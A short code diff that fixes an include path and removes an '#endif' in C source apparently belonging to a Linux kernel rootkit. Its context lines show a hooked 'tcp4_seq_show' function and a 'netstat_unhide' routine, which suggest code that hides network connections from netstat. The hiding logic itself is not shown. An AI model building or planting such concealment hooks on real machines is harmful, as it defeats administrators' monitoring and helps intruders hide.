@@ -1,4 +1,4 @@
-#include "socket.h"
+#include "./headers/socket.h"
 static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v)
 {
     long ret;
@@ -96,4 +96,3 @@ static void netstat_unhide(void)
 {
     fh_remove_hook(&tcp4_hook);
 }                                           
-#endif
